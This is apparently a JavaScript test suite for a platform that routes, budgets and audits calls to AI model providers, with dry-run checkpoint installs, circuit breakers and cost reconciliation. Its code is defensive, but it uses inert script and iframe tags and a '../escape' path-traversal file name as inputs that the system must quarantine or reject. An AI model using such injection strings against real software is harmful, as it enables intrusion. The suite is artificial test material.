    await assert.rejects(db.query("UPDATE app.generated_outputs SET disposition='publishable' WHERE id=$1",[safe.id]),/only quarantined/);
    await assert.rejects(db.query('DELETE FROM app.generated_outputs'),/append-only/);
    const rejected=await ops.recordOutput('<iframe src="x"></iframe>');await ops.rejectOutput(rejected.id);await assert.rejects(ops.assertOutputUsable(rejected.id,'publish'),code(/OUTPUT_QUARANTINED/));
  }finally{await db.close();}
});

test('DOTS-063 checkpoint installer is dry-run only and reports weight volume and costs; download is impossible without approved funding and storage',async()=>{
  const spec={name:'Gemma synthetic checkpoint',repository:'google/gemma-4-31b-it',revision:'a'.repeat(40),license:'gemma',lineage:'Google Gemma',files:[{path:'model-00001.safetensors',bytes:5*1024**3,sha256:'b'.repeat(64)},{path:'model-00002.safetensors',bytes:3*1024**3,sha256:'c'.repeat(64)}]};
  const original=globalThis.fetch;globalThis.fetch=never;try{
    const blocked=planCheckpointInstall(spec,{});
    assert.equal(blocked.dryRun,true);assert.equal(blocked.downloadPermitted,false);assert.equal(blocked.downloadPerformed,false);assert.equal(blocked.totalBytes,8*1024**3);assert.equal(blocked.totalGiB,8);
    for(const b of ['CHECKPOINT_INSTALL_ENABLED_NOT_TRUE','CHECKPOINT_FUNDING_NOT_AUTHORIZED','CHECKPOINT_STORAGE_NOT_APPROVED','CHECKPOINT_SPEND_CAP_NOT_SET','CHECKPOINT_STORAGE_PRICING_NOT_CONFIGURED'])assert.ok(blocked.blockers.includes(b),b);
    const approvals={CHECKPOINT_INSTALL_ENABLED:'true',CHECKPOINT_FUNDING_AUTHORIZATION_ID:'synthetic-funding',CHECKPOINT_STORAGE_APPROVAL_ID:'synthetic-storage',CHECKPOINT_SPEND_CAP_CENTS:'1000',CHECKPOINT_STORAGE_CENTS_PER_GB_MONTH:'3',CHECKPOINT_EGRESS_CENTS_PER_GB:'9'};
    const ready=planCheckpointInstall(spec,approvals);
    assert.deepEqual(ready.blockers,[]);assert.equal(ready.downloadPermitted,true);assert.equal(ready.downloadPerformed,false);assert.equal(ready.monthlyStorageCents,24);assert.equal(ready.downloadEgressCents,72);
    assert.ok(planCheckpointInstall(spec,{...approvals,CHECKPOINT_SPEND_CAP_CENTS:'50'}).blockers.includes('CHECKPOINT_COST_EXCEEDS_CAP'));
    assert.ok(planCheckpointInstall({...spec,revision:'main'},approvals).blockers.includes('CHECKPOINT_REVISION_NOT_PINNED'));
    assert.ok(planCheckpointInstall({...spec,license:'proprietary'},approvals).blockers.includes('CHECKPOINT_LICENSE_NOT_APPROVED'));
    assert.ok(planCheckpointInstall({...spec,files:[{path:'pytorch_model.bin',bytes:10,sha256:'d'.repeat(64)}]},approvals).blockers.includes('CHECKPOINT_UNSAFE_SERIALIZATION:pytorch_model.bin'));
    assert.ok(planCheckpointInstall({...spec,repository:'meta-llama/Llama-3'},approvals).blockers.includes('CHECKPOINT_LINEAGE_NOT_REVIEWED'));
    assert.throws(()=>planCheckpointInstall({...spec,repository:'Qwen/Qwen3-Coder-30B'},approvals),code(/PROVIDER_MODEL_NOT_ALLOWED/));
    assert.throws(()=>planCheckpointInstall({...spec,files:[{path:'../escape',bytes:1,sha256:'e'.repeat(64)}]},approvals),code(/CHECKPOINT_SPEC_INVALID/));
  }finally{globalThis.fetch=original;}
  const source=await readFile(new URL('../packages/operations/src/models.ts',import.meta.url),'utf8');
  const installer=source.slice(source.indexOf('export function planCheckpointInstall'),source.indexOf('/* ───', source.indexOf('export function planCheckpointInstall')));
  assert.doesNotMatch(installer,/fetch\(|transport\(|writeFile|createWriteStream/);
});

test('DOTS-064 router selects only approved, configured, permitted and funded pairs; private data never reaches the free route; zero budget skips without network',async()=>{
  const breaker={state:'closed',consecutiveFailures:0,openedCount:0,retryAt:null};
  const candidate=(provider,env,extra={})=>({provider,binding:binding(provider,env),revisionStatus:'approved',executionAuthorized:true,weight:50,breaker,budgetRemainingCents:provider==='openrouter'?0:500,...extra});
  const privateEnv={...paidEnv,OPENAI_PRIVATE_DATA_APPROVED:'true'};
  const priv=routeModel({taskClass:'draft',request:req('p',{privacyClass:'private'}),now:0,seed:'p',candidates:[candidate('openrouter',freeEnv),candidate('claude',paidEnv),candidate('openai',privateEnv)]});
  assert.equal(priv.selected.provider,'openai');
  assert.deepEqual(priv.considered.map(c=>c.reason),['PRIVACY_NOT_PERMITTED','PRIVACY_NOT_PERMITTED',null]);
  assert.deepEqual(priv.failover,[]);
  const none=routeModel({taskClass:'draft',request:req('p',{privacyClass:'private'}),now:0,seed:'p',candidates:[candidate('openrouter',freeEnv)]});
  assert.equal(none.selected,null);
  const budget=routeModel({taskClass:'draft',request:req('b'),now:0,seed:'b',candidates:[candidate('openai',paidEnv,{budgetRemainingCents:0}),candidate('claude',paidEnv,{budgetRemainingCents:2}),candidate('grok',paidEnv,{revisionStatus:null}),candidate('openrouter',freeEnv,{weight:0})]});
  assert.equal(budget.selected,null);assert.deepEqual(budget.considered.map(c=>c.reason),['BUDGET_ZERO','BUDGET_INSUFFICIENT','MODEL_NOT_REVIEWED','DISABLED_BY_ROUTING_WEIGHT']);
  const free=routeModel({taskClass:'draft',request:req('f'),now:0,seed:'f',candidates:[candidate('openrouter',freeEnv),candidate('openai',paidEnv)]});
  assert.ok(free.selected);if(free.selected.provider==='openrouter')assert.deepEqual(free.failover,[],'a free primary never lists a paid fallback');
  const tools=routeModel({taskClass:'tool_use',request:req('t',{tools:[lookupTool]}),now:0,seed:'t',candidates:[candidate('openrouter',freeEnv),candidate('claude',paidEnv,{breaker:{state:'open',consecutiveFailures:3,openedCount:1,retryAt:10}})]});
  assert.equal(tools.selected,null);assert.deepEqual(tools.considered.map(c=>c.reason),['CAPABILITY_MISSING_TOOLS','CIRCUIT_OPEN']);
  const weighted=seed=>routeModel({taskClass:'draft',request:req(seed),now:0,seed,candidates:[candidate('openai',paidEnv,{weight:100}),candidate('claude',paidEnv,{weight:0})]}).selected.provider;
  assert.deepEqual(new Set(Array.from({length:20},(_,i)=>weighted(`s${i}`))),new Set(['openai']));
  const split=Array.from({length:200},(_,i)=>routeModel({taskClass:'draft',request:req('x'),now:0,seed:`seed-${i}`,candidates:[candidate('openai',paidEnv,{weight:50}),candidate('claude',paidEnv,{weight:50})]}).selected.provider);
  assert.equal(routeModel({taskClass:'draft',request:req('x'),now:0,seed:'seed-7',candidates:[candidate('openai',paidEnv),candidate('claude',paidEnv)]}).selected.provider,split[7],'deterministic for a seed');
  assert.ok(split.includes('openai')&&split.includes('claude'));
  const {db,client,control}=await setup();try{
    const ops=new ModelOperations(client,ctx);
    await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',reviewRef:'synthetic-review'});await ops.setRoutingWeight(agent,'openai',100);
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('zero-budget'),environment:paidEnv,transport:never}),code(/NO_ELIGIBLE_MODEL/));
    const exec=(await db.query("SELECT state,reason_code,result FROM app.model_executions")).rows[0];
    assert.equal(exec.state,'failed');assert.equal(exec.result.considered.find(c=>c.provider==='openai').reason,'BUDGET_ZERO');
    await control.setBudget(500,'synthetic-owner-authorization',500);
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('private-1',{privacyClass:'private'}),environment:{...paidEnv,...freeEnv},transport:never}),code(/NO_ELIGIBLE_MODEL/));
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('unauthorized'),environment:{...paidEnv,MODEL_API_ENABLED:'false'},transport:never}),code(/NO_ELIGIBLE_MODEL/));
    await assert.rejects(ops.setRoutingWeight(agent,'openai',101),code(/INVALID_WEIGHT/));
    await assert.rejects(ops.setRoutingWeight(agent,'deepseek',10),code(/INVALID_PROVIDER/));
  }finally{await db.close();}
});

test('DOTS-065 bounded backoff and breaker transitions are deterministic and capped',()=>{
  for(let attempt=0;attempt<12;attempt++){const ceiling=Math.min(8000,500*2**attempt);for(const r of [0,0.5,1]){const d=backoffDelayMs(attempt,()=>r);assert.ok(d>=ceiling/2&&d<=ceiling,`${attempt}:${d}`);}}
  assert.equal(backoffDelayMs(0,()=>0,500,8000,60000),8000,'retry-after is honoured but bounded');
  assert.equal(backoffDelayMs(1,()=>2),1000,'jitter is clamped');
  let s={state:'closed',consecutiveFailures:0,openedCount:0,retryAt:null};
  s=nextBreakerState(s,'failure',0);s=nextBreakerState(s,'failure',0);assert.equal(s.state,'closed');
  s=nextBreakerState(s,'failure',1000);assert.equal(s.state,'open');assert.equal(s.retryAt,31000);
  s=nextBreakerState({...s,state:'half_open'},'failure',40000);assert.equal(s.state,'open');assert.equal(s.retryAt,100000,'cooldown doubles');
  assert.deepEqual(nextBreakerState(s,'success',0),{state:'closed',consecutiveFailures:0,openedCount:0,retryAt:null});
});

test('DOTS-065 chaos: 429/5xx retry with backoff, timeouts never retry, breakers persist, failover is audited and nothing double-executes or exceeds budget',async()=>{
  const {db,client,control}=await setup();try{
    const ops=new ModelOperations(client,ctx);
    for(const [provider,model] of [['openai','gpt-fixture-1'],['claude','claude-fixture-1']])await ops.registerRevision({provider,model,reviewRef:'synthetic-review'});
    await ops.setRoutingWeight(agent,'openai',100);await ops.setRoutingWeight(agent,'claude',1);
    await control.setBudget(500,'synthetic-owner-authorization',500);
    const policy=async()=>{const r=(await db.query('SELECT reserved_cents,spent_cents,limit_cents FROM app.spending_policies WHERE project_id IS NULL')).rows[0];return {reserved:Number(r.reserved_cents),spent:Number(r.spent_cents),limit:Number(r.limit_cents)};};
    const sleeps=[];const sleep=async ms=>{sleeps.push(ms);};let clock=1_000_000;const now=()=>clock;
    // 429, 503, then success: three attempts, two bounded sleeps, one billed call.
    let posts=0;const flaky=async()=>{posts++;return posts===1?new Response('',{status:429}):posts===2?new Response('',{status:503}):openaiOk();};
    const ok=await ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-1'),environment:paidEnv,transport:flaky,sleep,random:()=>0.5,now});
    assert.equal(posts,3);assert.equal(sleeps.length,2);assert.ok(sleeps.every(ms=>ms<=8000));assert.equal(ok.summary.costCents,3);
    assert.deepEqual(await policy(),{reserved:0,spent:3,limit:500});
    const replay=await ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-1'),environment:paidEnv,transport:never,sleep,now});
    assert.equal(replay.replayed,true);assert.equal(replay.summary.costCents,3);
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-1',{system:'changed'}),environment:paidEnv,transport:never}),code(/IDEMPOTENCY_CONFLICT/));
    assert.equal((await db.query("SELECT count(*)::int AS n FROM app.operation_events WHERE event_type='model.retry_scheduled'")).rows[0].n,2);
    // In-flight duplicate is refused while the first call is pending.
    let release;const gate=new Promise(r=>{release=r;});let entered;const enteredP=new Promise(r=>{entered=r;});
    const first=ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-2'),environment:paidEnv,transport:async()=>{entered();await gate;return openaiOk();},sleep,now});
    await enteredP;
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-2'),environment:paidEnv,transport:never,sleep,now}),code(/MODEL_EXECUTION_IN_PROGRESS/));
    release();await first;
    // Timeout: ambiguous, never retried or failed over; reservation held for reconciliation.
    posts=0;const before=await policy();
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-3'),environment:paidEnv,transport:async()=>{posts++;throw new DOMException('timed out','TimeoutError');},sleep,now,allowFailover:true,allowPaidFailover:true}),code(/PROVIDER_TIMEOUT/));
    assert.equal(posts,1);const held=await policy();assert.ok(held.reserved>before.reserved,'reservation is held, not released');
    assert.equal((await db.query("SELECT state FROM app.model_executions WHERE idempotency_key='chaos-3'")).rows[0].state,'reconciliation_required');
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-3'),environment:paidEnv,transport:never}),code(/MODEL_EXECUTION_NEEDS_RECONCILIATION/));
    assert.equal((await db.query("SELECT usage_source FROM app.model_usage_records WHERE idempotency_key='chaos-3'")).rows[0].usage_source,'missing');
    // 5xx storm on OpenAI: breaker opens, audited failover to Claude only when paid failover is explicitly allowed.
    await ops.resetBreaker('openai','gpt-fixture-1');
    const hits={openai:0,claude:0};
    const storm=async url=>{if(url.includes('openai')){hits.openai++;return new Response('',{status:500});}hits.claude++;return Response.json({id:'msg_f',model:'claude-fixture-1',content:[{type:'text',text:'Fallback draft'}],stop_reason:'end_turn',usage:{input_tokens:100,output_tokens:50}});};
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-4'),environment:paidEnv,transport:storm,sleep,now,allowFailover:true}),code(/MODEL_PROVIDERS_EXHAUSTED/));
    assert.equal(hits.openai,3);assert.equal(hits.claude,0,'paid failover needs explicit authorization');
    assert.equal((await db.query("SELECT count(*)::int AS n FROM app.operation_events WHERE event_type='model.failover_refused'")).rows[0].n,1);
    const breaker=(await db.query("SELECT state,consecutive_failures FROM app.model_breakers WHERE provider_id='openai'")).rows[0];assert.equal(breaker.state,'open');
    const afterStorm=await policy();assert.equal(afterStorm.reserved,held.reserved,'rejected attempts released their reservation');
    hits.openai=0;
    const failover=await ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-5'),environment:paidEnv,transport:storm,sleep,now,allowFailover:true,allowPaidFailover:true});
    assert.equal(hits.openai,0,'open breaker skips the provider without a network call');assert.equal(hits.claude,1);assert.equal(failover.summary.provider,'claude');
    // Breaker cools down, then a half-open probe success closes it.
    clock+=31_000;hits.openai=0;
    const recovered=await ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-6'),environment:paidEnv,transport:async()=>{hits.openai++;return openaiOk();},sleep,now});
    assert.equal(recovered.summary.provider,'openai');assert.equal((await db.query("SELECT state FROM app.model_breakers WHERE provider_id='openai'")).rows[0].state,'closed');
    const final=await policy();assert.ok(final.reserved+final.spent<=final.limit);
    const ledger=(await db.query("SELECT count(*)::int AS n FROM app.money_entries")).rows[0].n;assert.equal(ledger,4,'one ledger entry per completed execution');
    assert.ok((await db.query("SELECT count(*)::int AS n FROM app.operation_events WHERE event_type IN ('model.breaker_transition','model.route_decided')")).rows[0].n>=4);
    // Non-retryable provider rejection releases the hold.
    const pre=await policy();
    await assert.rejects(ops.execute({agentId:agent,taskClass:'draft',request:req('chaos-7'),environment:paidEnv,transport:async()=>new Response('',{status:400}),sleep,now}),code(/PROVIDER_REJECTED/));
    assert.deepEqual(await policy(),pre);
  }finally{await db.close();}
});

test('DOTS-066 usage reconciles with the ledger; pricing versions are immutable; estimated usage, overruns and invoices are flagged separately',async()=>{
  const {db,client,control}=await setup();try{
    const ops=new ModelOperations(client,ctx);
    await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',reviewRef:'synthetic-review'});await ops.setRoutingWeight(agent,'openai',100);
    await control.setBudget(500,'synthetic-owner-authorization',500);
    const v1=await ops.addPricingVersion({provider:'openai',model:'gpt-fixture-1',inputCentsPerMillion:10000,outputCentsPerMillion:40000,sourceRef:'synthetic price sheet'});
    assert.equal((await ops.addPricingVersion({provider:'openai',model:'gpt-fixture-1',inputCentsPerMillion:10000,outputCentsPerMillion:40000,sourceRef:'same'})).id,v1.id);
    const v2=await ops.addPricingVersion({provider:'openai',model:'gpt-fixture-1',inputCentsPerMillion:12000,outputCentsPerMillion:40000,sourceRef:'synthetic update'});assert.equal(v2.version,2);
    await assert.rejects(db.query('UPDATE app.model_pricing_versions SET input_cents_per_million=1'),/append-only/);
    await assert.rejects(ops.addPricingVersion({provider:'openrouter',model:gemma,inputCentsPerMillion:1,outputCentsPerMillion:0,sourceRef:'x'}),code(/FREE_PROVIDER_CONFIGURATION_INVALID/));
    await ops.execute({agentId:agent,taskClass:'draft',request:req('usage-1'),environment:paidEnv,transport:async()=>openaiOk()});
    const usage=(await db.query("SELECT u.*,p.version FROM app.model_usage_records u JOIN app.model_pricing_versions p ON p.id=u.pricing_version_id")).rows[0];
    assert.equal(Number(usage.version),3,'environment rates differ from v2, so a new immutable version is appended');
    assert.equal(Number(usage.reasoning_tokens),10);assert.equal(usage.usage_source,'provider_reported');
    let rec=await ops.reconcile();assert.equal(rec.reconciled,true);assert.equal(rec.providerReportedCents,3);assert.equal(rec.ledgerCents,3);
    // Provider omitted usage: charged at the worst-case estimate, flagged as estimated.
    await ops.execute({agentId:agent,taskClass:'draft',request:req('usage-2'),environment:paidEnv,transport:async()=>Response.json({id:'r',model:'gpt-fixture-1',status:'completed',output:[{type:'message',content:[{type:'output_text',text:'No usage'}]}]})});
    rec=await ops.reconcile();assert.equal(rec.estimated.count,1);assert.ok(rec.estimated.cents>0);assert.equal(rec.providerReportedCents,3);assert.equal(rec.reconciled,true);
    // Reported usage larger than the reservation: ledger capped at the reservation, mismatch surfaced.
    await ops.execute({agentId:agent,taskClass:'draft',request:req('usage-3'),environment:paidEnv,transport:async()=>openaiOk('Big',{usage:{input_tokens:5000000,output_tokens:10}})});
    rec=await ops.reconcile();assert.equal(rec.reconciled,false);assert.equal(rec.mismatched.length,1);assert.ok(rec.mismatched[0].usageCents>rec.mismatched[0].ledgerCents);
    const policy=(await db.query('SELECT reserved_cents,spent_cents,limit_cents FROM app.spending_policies WHERE project_id IS NULL')).rows[0];assert.ok(Number(policy.spent_cents)+Number(policy.reserved_cents)<=Number(policy.limit_cents));
    const today=new Date().toISOString().slice(0,10);
    await ops.recordInvoice({provider:'openai',periodStart:today,periodEnd:today,amountCents:3,evidenceRef:'synthetic-invoice-1'});
    await assert.rejects(ops.recordInvoice({provider:'openai',periodStart:today,periodEnd:today,amountCents:4,evidenceRef:'synthetic-invoice-1'}),code(/IDEMPOTENCY_CONFLICT/));
    rec=await ops.reconcile();assert.equal(rec.invoices.length,1);assert.notEqual(rec.invoices[0].differenceCents,0);
    await assert.rejects(db.query('DELETE FROM app.model_usage_records'),/append-only/);
  }finally{await db.close();}
});

test('DOTS-067 snapshot and UI disclose absent keys, privacy, cost status and disabled models truthfully without secrets',async()=>{
  const {db,client}=await setup();try{
    const ops=new ModelOperations(client,ctx);await ops.setRoutingWeight(agent,'claude',40);
    const empty=await ops.snapshot({});
    assert.equal(empty.providers.length,4);assert.ok(empty.providers.every(p=>p.state==='not_connected'&&!p.credential.present));
    assert.equal(empty.controls.paidExecutionAuthorized,false);assert.equal(empty.weights[0].weight,40);assert.equal(empty.agents.length,1);
    const configured=await ops.snapshot({...paidEnv,...freeEnv});assert.doesNotMatch(JSON.stringify(configured),/synthetic-[a-z]+-credential/);
    assert.equal(configured.reconciliation.usageRecords,0);
  }finally{await db.close();}
  const view=await readFile(new URL('../apps/web/app/views/models-view.tsx',import.meta.url),'utf8');
  assert.match(view,/export function ModelsView\(\)/);assert.match(view,/\/api\/v1\/models/);assert.match(view,/aria-live/);assert.match(view,/role="alert"/);
  assert.match(view,/Missing/);assert.match(view,/privacy/i);assert.match(view,/costStatus/);
  assert.doesNotMatch(view,/type="password"|apiKey|api_key/,'keys are never entered in the browser');
  assert.doesNotMatch(view,/onMouseEnter|onDrag/);
  const route=await readFile(new URL('../apps/web/app/api/v1/models/route.ts',import.meta.url),'utf8');
  for(const required of ["export const dynamic='force-dynamic'",'ownerSession()','hasTrustedOrigin(request)','withOperations','private, no-store','UNKNOWN_ACTION'])assert.ok(route.includes(required),required);
});

test('DOTS-068 deterministic benchmark compares approved adapters on fixtures without live claims or charges',async()=>{
  const original=globalThis.fetch;globalThis.fetch=never;try{
    const bindings=[binding('openai'),binding('claude'),binding('grok'),binding('openrouter',freeEnv)];
    const first=await runAdapterBenchmark(bindings),second=await runAdapterBenchmark(bindings);
    assert.deepEqual(first,second);assert.equal(first.liveEvidence,false);assert.equal(first.evidenceKind,'stub-fixture');assert.equal(first.realChargesCents,0);
    assert.equal(first.results.length,bindings.length*BENCHMARK_CASES.length);
    for(const r of first.results)assert.notEqual(r.status,'failed',`${r.provider}/${r.caseId}: ${r.detail}`);
    for(const id of ['openai','claude','grok'])assert.equal(first.summary.find(s=>s.provider===id).passed,BENCHMARK_CASES.length);
    assert.equal(first.results.find(r=>r.provider==='openrouter'&&r.caseId==='tool-crm-lookup').status,'not_applicable');
    assert.equal(first.results.find(r=>r.caseId==='latency-budget').simulatedLatencyMs,1200);
    const slow=await runAdapterBenchmark([binding('openai')],[{...BENCHMARK_CASES.at(-1),reply:{...BENCHMARK_CASES.at(-1).reply,latencyMs:2500}}]);
    assert.equal(slow.results[0].status,'failed');assert.match(slow.results[0].detail,/latency/);
    assert.equal(providerStubBody('claude','claude-fixture-1',{text:'x',latencyMs:1}).stop_reason,'end_turn');
  }finally{globalThis.fetch=original;}
});

test('DOTS-069 live smoke gate refuses without explicit flags and funded caps, reports blockers, and never assumes success',async()=>{
  const blocked=planModelSmoke({});assert.equal(blocked.ready,false);
  for(const b of ['MODEL_SMOKE_ENABLED_NOT_TRUE','MODEL_SMOKE_PROVIDERS_NOT_SET','MODEL_SMOKE_CAP_CENTS_NOT_SET'])assert.ok(blocked.blockers.includes(b));
  const noKey=planModelSmoke({MODEL_SMOKE_ENABLED:'true',MODEL_SMOKE_PROVIDERS:'openai,deepseek',MODEL_SMOKE_CAP_CENTS:'5'});
  assert.equal(noKey.ready,false);assert.ok(noKey.providers[0].blockers.includes('MISSING_OPENAI_API_KEY'));assert.ok(noKey.providers[0].blockers.includes('OWNER_FUNDED_CAP_NOT_CONFIGURED'));assert.deepEqual(noKey.providers[1].blockers,['PROVIDER_NOT_ALLOWED']);
  const outcome=await runModelSmoke({},never);assert.equal(outcome.status,'blocked');assert.equal(outcome.networkCalls,false);
  const funded={...paidEnv,MODEL_SMOKE_ENABLED:'true',MODEL_SMOKE_PROVIDERS:'openai,claude',MODEL_SMOKE_CAP_CENTS:'50'};
  assert.ok(planModelSmoke({...funded,MODEL_SMOKE_CAP_CENTS:'900'}).providers[0].blockers.includes('MODEL_SMOKE_CAP_EXCEEDS_PAID_SPEND_LIMIT'));
  assert.ok(planModelSmoke({...funded,MODEL_SMOKE_CAP_CENTS:'1'}).blockers.includes('MODEL_SMOKE_TOTAL_ESTIMATE_EXCEEDS_CAP'));
  const plan=planModelSmoke(funded);assert.equal(plan.ready,true,JSON.stringify(plan));
  let calls=0;
  const live=await runModelSmoke(funded,async url=>{calls++;return url.includes('openai')?openaiOk('READY'):new Response('',{status:401});},()=>Date.UTC(2026,10,14));
  assert.equal(calls,2);assert.equal(live.status,'failed');
  assert.equal(live.receipts[0].passed,true);assert.equal(live.receipts[0].providerRequestId,'resp_fixture');assert.equal(live.receipts[0].costCents,3);
  assert.deepEqual(live.receipts[1],{provider:'claude',model:'claude-fixture-1',passed:false,blocker:'PROVIDER_CREDENTIAL_REJECTED'});
  assert.ok(live.spentCents<=plan.capCents);assert.doesNotMatch(JSON.stringify(live),/synthetic-[a-z]+-credential/);
  const wrong=await runModelSmoke({...funded,MODEL_SMOKE_PROVIDERS:'openai'},async()=>openaiOk('Something else'));assert.equal(wrong.status,'failed','an unexpected reply is not counted as success');
  const script=spawnSync(process.execPath,['scripts/model-smoke.mjs'],{cwd:root,env:{PATH:process.env.PATH},encoding:'utf8'});
  assert.equal(script.status,2,script.stderr);const printed=JSON.parse(script.stdout);assert.equal(printed.status,'blocked');assert.equal(printed.networkCalls,false);assert.match(printed.note,/Blocked on external prerequisite/);
  const planOnly=spawnSync(process.execPath,['scripts/model-smoke.mjs','--plan'],{cwd:root,env:{PATH:process.env.PATH,MODEL_SMOKE_ENABLED:'true',MODEL_SMOKE_PROVIDERS:'grok',MODEL_SMOKE_CAP_CENTS:'5'},encoding:'utf8'});
  assert.equal(planOnly.status,2);assert.ok(JSON.parse(planOnly.stdout).plan.providers[0].blockers.includes('MISSING_GROK_API_KEY'));
});

test('migration 0016 rolls back and re-applies cleanly',async()=>{
  const {db}=await setup();try{
    const up=await readFile(new URL('../database/migrations/0016_model_execution.up.sql',import.meta.url),'utf8'),down=await readFile(new URL('../database/migrations/0016_model_execution.down.sql',import.meta.url),'utf8');
    await db.exec(down);
    assert.equal((await db.query("SELECT count(*)::int AS n FROM pg_tables WHERE schemaname='app' AND (tablename LIKE 'model_%' OR tablename='generated_outputs')")).rows[0].n,0);
    await db.exec(up);
    assert.equal((await db.query("SELECT count(*)::int AS n FROM pg_tables WHERE schemaname='app' AND (tablename LIKE 'model_%' OR tablename='generated_outputs')")).rows[0].n,8);
  }finally{await db.close();}
});

test('runtime grants for model tables are least-privilege and support the model workflows under RLS',async()=>{
  const {db,client,control}=await setup();try{
    await control.setBudget(500,'synthetic-owner-authorization',500);
    await db.exec('CREATE ROLE dots_runtime NOLOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOBYPASSRLS;GRANT USAGE ON SCHEMA app TO dots_runtime;GRANT SELECT ON app.memberships,app.projects,app.agent_identities,app.agent_project_assignments,app.audit_events TO dots_runtime;GRANT INSERT ON app.audit_events TO dots_runtime;');
    await db.exec(await readFile(new URL('../database/runtime-grants.sql',import.meta.url),'utf8'));
    await db.exec(await readFile(new URL('../database/runtime-grants-0016.sql',import.meta.url),'utf8'));
    await db.exec('SET ROLE dots_runtime');
    for(const table of ['model_revisions','model_pricing_versions','model_usage_records','model_provider_invoices','generated_outputs','model_executions','model_breakers','model_routing_weights'])
      assert.equal((await db.query("SELECT has_table_privilege('dots_runtime',$1,'DELETE') AS allowed",[`app.${table}`])).rows[0].allowed,false,table);
    for(const [table,column] of [['model_revisions','status'],['model_pricing_versions','input_cents_per_million'],['model_usage_records','cost_cents'],['generated_outputs','content_hash'],['generated_outputs','organization_id'],['model_executions','request_hash'],['model_executions','id']])
      assert.equal((await db.query("SELECT has_column_privilege('dots_runtime',$1,$2,'UPDATE') AS allowed",[`app.${table}`,column])).rows[0].allowed,false,`${table}.${column}`);
    const ops=new ModelOperations(client,ctx);
    await ops.registerRevision({provider:'openai',model:'gpt-fixture-1',reviewRef:'synthetic-review'});await ops.setRoutingWeight(agent,'openai',100);await ops.setRoutingWeight(agent,'openai',90);
    const result=await ops.execute({agentId:agent,taskClass:'draft',request:req('runtime-1'),environment:paidEnv,transport:async()=>openaiOk('<script>x</script>')});
    assert.equal(result.summary.outputDisposition,'quarantined');
    await ops.releaseOutput(result.summary.outputId,{use:'publish',authorizationRef:'owner-ok',securityCheckRef:'scan-1'});
    assert.equal((await ops.reconcile()).reconciled,true);
    await ops.snapshot(paidEnv);
  }finally{await db.close();}
});
